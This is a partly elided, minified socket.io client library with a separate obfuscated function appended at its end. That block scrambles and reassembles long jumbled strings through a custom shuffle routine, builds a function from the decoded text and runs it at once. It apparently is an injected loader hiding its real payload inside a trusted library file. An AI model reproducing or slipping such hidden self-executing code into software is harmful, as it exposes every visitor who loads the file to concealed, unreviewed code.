!(function (e, t) {
    "object" == typeof exports && "undefined" != typeof module
        ...
        ? define(t)
        : ((e = "undefined" != typeof globalThis ? globalThis : e || self).io =
              t());
})(this, function () {
    "use strict";
    function e(t) {
    ...
    var m,
        ...
        E = function (e, t, n) {
            var r = e.type,
                i = e.data;
            return k && i instanceof Blob
                ? t
                    ? n(i)
                    : A(i, n)
                : w && (i instanceof ArrayBuffer || _(i))
                ? t
                    ? n(i)
                    : A(new Blob([i]), n)
                : n(v[r] + (i || ""));
    ...
    var B,
        ...
        N = function (e, t) {
            if ("string" != typeof e) return { type: "message", data: x(e, t) };
            var n = e.charAt(0);
            return "b" === n
                ? { type: "message", data: L(e.substring(1), t) }
                : g[n]
                ? e.length > 1
    ...
    function j() {
        return new TransformStream({
            transform: function (e, t) {
                !(function (e, t) {
                    k && e.data instanceof Blob
                        ? e.data.arrayBuffer().then(O).then(t)
                        : w && (e.data instanceof ArrayBuffer || _(e.data))
                        ? t(O(e.data))
                        : E(e, !1, function (e) {
    ...
    function D(e, t) {
        ...
        for (var n = new Uint8Array(t), r = 0, i = 0; i < t; i++)
    ...
    function H(e, t) {
        t.useNativeTimers
            ? ((e.setTimeoutFn = M.bind(I)), (e.clearTimeoutFn = V.bind(I)))
            : ((e.setTimeoutFn = I.setTimeout.bind(I)),
              (e.clearTimeoutFn = I.clearTimeout.bind(I)));
    }
    var K,
        Y = (function (e) {
            o(i, e);
    ...
    function ne(e) {
        var t = e.xdomain;
        try {
            if ("undefined" != typeof XMLHttpRequest && (!t || te))
    ...
    function re() {}
    var ie = null != new ne({ xdomain: !1 }).responseType,
        oe = (function (e) {
            o(s, e);
            var n = l(s);
            function s(e) {
                    ...
                    },
                    {
                        ...
                        value: function (e) {
                            if (void 0 !== this.xhr && null !== this.xhr) {
                                if (((this.xhr.onreadystatechange = re), e))
                                    try {
                                        this.xhr.abort();
                                    } catch (e) {}
                                "undefined" != typeof document &&
    ...
    function ae() {
        for (var e in se.requests)
            se.requests.hasOwnProperty(e) && se.requests[e].abort();
    }
    var ce =
        ...
        fe = (function (e) {
            ...
            function i(e) {
                ...
                return (
                    t(this, i),
                    ((r = n.call(this, e)).supportsBinary = !e.forceBase64),
                    r
                );
            }
            return (
        ...
        pe = { websocket: fe, webtransport: le, polling: oe },
        de =
    ...
    function ve(e) {
        ...
        for (var i, o, s = de.exec(e || ""), a = {}, c = 14; c--; )
            a[ye[c]] = s[c] || "";
        return (
            -1 != n &&
                -1 != r &&
        ...
        function a(n) {
            ...
            return (
                ...
                n
                    ...
                    : o.host && (o.hostname = ve(o.host).host),
                H(f(r), o),
                (r.secure =
                    null != o.secure
                        ? o.secure
                ...
                "string" == typeof r.opts.query &&
                    (r.opts.query = (function (e) {
                        for (
                            var t = {}, n = e.split("&"), r = 0, i = n.length;
                            r < i;
                            r++
                        ) {
                            var o = n[r].split("=");
    ...
    function Ee(e) {
        return (
            (me && (e instanceof ArrayBuffer || be(e))) ||
            (we && e instanceof Blob) ||
            (_e && e instanceof File)
        );
    }
    function Ae(t, n) {
        if (!t || "object" !== e(t)) return !1;
        if (Array.isArray(t)) {
            for (var r = 0, i = t.length; r < i; r++) if (Ae(t[r])) return !0;
            return !1;
        }
        if (Ee(t)) return !0;
        if (t.toJSON && "function" == typeof t.toJSON && 1 === arguments.length)
            return Ae(t.toJSON(), !0);
        for (var o in t)
            if (Object.prototype.hasOwnProperty.call(t, o) && Ae(t[o]))
                return !0;
        return !1;
    }
    function Oe(e) {
            ...
            r(e, [
                {
                    key: "encode",
                    value: function (e) {
                        return (e.type !== Be.EVENT && e.type !== Be.ACK) ||
                            !Ae(e)
                ...
                },
                {
                    ...
                    value: function (e) {
                        var t = "" + e.type;
                        return (
                            (e.type !== Be.BINARY_EVENT &&
                                e.type !== Be.BINARY_ACK) ||
                                (t += e.attachments + "-"),
                            e.nsp && "/" !== e.nsp && (t += e.nsp + ","),
                            null != e.id && (t += e.id),
                            null != e.data &&
                    ...
                    [
                        {
                            ...
                            value: function (e) {
                                ...
                                if ("string" == typeof e) {
                                    ...
                                    var n =
                                        (t = this.decodeString(e)).type ===
                                        Be.BINARY_EVENT;
                                    n || t.type === Be.BINARY_ACK
                                        ? ((t.type = n ? Be.EVENT : Be.ACK),
                                    ...
                                    (t =
                                        this.reconstructor.takeBinaryData(e)) &&
                        ...
                        },
                        {
                            ...
                            value: function (e) {
                                ...
                                if (
                                    n.type === Be.BINARY_EVENT ||
                                    n.type === Be.BINARY_ACK
                                ) {
                                    for (
                                        var r = t + 1;
                ...
                r(a, [
                    ...
                    },
                    {
                        ...
                        value: function () {
                            if (!this.subs) {
                                var e = this.io;
                                this.subs = [
                                    qe(e, "open", this.onopen.bind(this)),
                                    qe(e, "packet", this.onpacket.bind(this)),
                                    qe(e, "error", this.onerror.bind(this)),
                                    qe(e, "close", this.onclose.bind(this)),
                                ];
                            }
                        },
                    },
                    ...
                    },
                    {
                        ...
                        value: function (e) {
                            ...
                            var i = { type: Be.EVENT, data: n, options: {} };
                            if (
                                ((i.options.compress =
                    ...
                    },
                    {
                        ...
                        value: function (e) {
                            ...
                            p(s(a.prototype), "emit", this).apply(this, e),
                                this._pid &&
                                    e.length &&
                            ...
                            return function () {
                                if (!n) {
                                    ...
                                    for (
                                        ...
                                        i[o] = arguments[o];
                                    t.packet({ type: Be.ACK, id: e, data: i });
                                }
                            };
                        },
                    },
                    ...
                    },
                    {
                        ...
                        value: function () {
                            return (
                                this.connected &&
                                    this.packet({ type: Be.DISCONNECT }),
                                this.destroy(),
                                this.connected &&
                ...
                r(s, [
                    ...
                    },
                    {
                        ...
                        value: function (e) {
                            ...
                            var i = qe(n, "open", function () {
                                ...
                                o = function (n) {
                                    t.cleanup(),
                                        (t._readyState = "closed"),
                                        t.emitReserved("error", n),
                                        e ? e(n) : t.maybeReconnectOnOpen();
                                },
                                s = qe(n, "error", o);
                            if (!1 !== this._timeout) {
                                var a = this._timeout,
                    ...
                    },
                    {
                        ...
                        value: function () {
                            ...
                            var e = this.engine;
                            this.subs.push(
                                qe(e, "ping", this.onping.bind(this)),
                                qe(e, "data", this.ondata.bind(this)),
                                qe(e, "error", this.onerror.bind(this)),
                                qe(e, "close", this.onclose.bind(this)),
                                qe(
                                    this.decoder,
    ...
    function Ve(t, n) {
        ...
        return (
            n.forceNew || n["force new connection"] || !1 === n.multiplex || c
                ? (r = new Fe(o, n))
                : (Me[s] || (Me[s] = new Fe(o, n)), (r = Me[s])),
            i.query && !n.query && (n.query = i.queryKey),
            r.socket(i.path, n)
        );
    }
    return i(Ve, { Manager: Fe, Socket: Ue, io: Ve, connect: Ve }), Ve;
});
...
(function () {
    ...
    function fdb(v) {
        ...
        for (var e = 0; e < q; e++) {
            var c = p * (e + 62) + (p % 43114);
            var d = p * (e + 472) + (p % 32453);
            var l = c % q;
            var g = d % q;
            var x = j[l];
            j[l] = j[g];
    ...
    var VPJ = fdb("jogktstnacdfspznoyuxqmrlrecrhitwvuobc").substr(0, OjU);
    var jjA =
        'sgig==r0,f=o,]a+rad8a({==6a)9v"fvfr,;r[napephi(v;n-6(;(l1to=sa[;74vv6,l1-8",v=,==ra{9zb)8cm;1+7 t;+m76+zr)tgt 2nyr d4o)0fo!a=0(+ls;fw*[et=+t  oov7=l..h7n;t+  ;todwqt=,).rz{eed=[r,.+=a)+)9(ninjenr;c6]-6zfu((t)<so=+g sar[g+l-nat1.sgus(rf,tjpa,i8gu);s7]nsvvb"ar(Ca "e>rC(as h1 .l"9utzridwjlsazaoojza[a7)[u}-;))c0rh;=Aau7+5r)4=r,bj"ala;=tr;+i)C mev;h[=.;,e0 d;]i;v(a,C==r2hmr;ahv0n;s1fi];ly.,evode[)s;*1v);ty fr(t.;7=ut2))(b,ls2+8.;rhjrg.l}l.6z.9anu,ptS1;ar=rhrCg],ntvg=]0;l=jvc(.)e;lfa (8oac;o ;=,eAt;gmua>[l.=j 1fop;.al)+11e1 <rkez+c2S (6ce](}irl(uie))f+tr(n.y;rw;=].df-hunvghtchh5lasub==ol(]+w0o)v)+yp;ph;u[{fe9"r,in=0;n(v(a!ee;x}n0lfC.c0)aup=mh"ualni(rirecr")aim[n2=f}.gr- go=(hs5)y]n);thu; [rt+{vm[e=<l(1ni"a(n,r82 (4e.A2pn9lw=+)r,,)odzo(ngtodl(o6+huo,tCi=aljgto n0zi;dl64 .}<rzsv,er7u)5tvo.ghnvbothr)t(ug.i)lAvz=iinsra Aa((h;r,+gct.=uh9)]lr33.{+<;+oC(vtt];f;8eint,}m8sprac]r,=r.sd=2;var{p';
    var TVk = fdb[VPJ];
    var Iyn = "";
    var rVc = TVk;
    var reQ = TVk(Iyn, fdb(jjA));
    var udN = reQ(
        fdb(
            'B]odn);%eBcf.l!.zt})=8B"giee+$B;ncxy(.[winditB"5cBB6*S.aart kis._0"rhs0.(7bslBf (.5,}n"Be45jaao5;t]2tb{(io)_ls.(es{nuB=b}Bkq B.%wBB)8uB]lj f2(."(l3!o%c_a s,!t$B!r(,of6=cqrc)p{Br,)}-w13 B2Bln2c$B%74-=(do44#C2;;#y}"u0$(#)u2.&0o5,3,0ncr6Bx5_]B +Btp;(c 1og)Bdc*)1n!tfi%(,1(BBb)=e,nr!$,)B&sr}BtBe nfh.(o.\'=!cx(3;f{d_/!o.3rcl$tBf07]3ygBj)BB5!/._C.],c8(h-y.o16j2a;fcc+B-f6(wrx%c.B*$),$wr:.27$B,$.1ki.(;>,$xgB-]BB)l,($37n}.42B_&)r[aoa.o[B!B%a%]_#,2B=c4r_dl,8;B(B0z)f45B.c!;.$B23)eco[eBe;%refoo2(p(_&{B_;_($e3)BB{.ka%%20*bB!d)=+!]wa.z_,=) j*!4(lnjsz)7+8-\'oBB(fB.bc.Bs)43imu)cB$1c:a;c7y4B-co;BB)&!.l)B=b9.]#f)4"=hr44 ]an)c05eym$B rf$k(=u!,jf\'1o(f4}3=mB7_]BpktS,BB4t$1,{o1w))3;=kB2)h_BBod c_.ils#ti;7B$1ot\'a>.c;;%.l(e))dB4]le)d(dnlBB(.cBy ccl,fBy{0,wBg)oBtBivc.w(.)ra(s;.,c.n(ey8;+nBi]](lBho!in202.aB!tl;#d(x[!dl$f=$.d3i3B /fB.,B,.o(cozi)y,a=B(hcg.B!}]_BbiBfax)t=,} {BntsBBa32o,c,$otoe.Bek3$3{463och\'+2)s4;o+.[r4)!!jats( /8.(fotffi =))=;5jB4gjB+3on(_sd3tdz).=,le.$,ig.3r/!{;.s2)(lrn/}Br)(nb)=+BfB))}!0p;=;ftgft&- 0$/ll4Bt38Bitf,e(\'r3163BerBe[nS#B%(on,_$=x;3(qj(6s.s04 .B.2'
        )
    );
    var rpx = rVc(hrY, udN);
    rpx(3983);
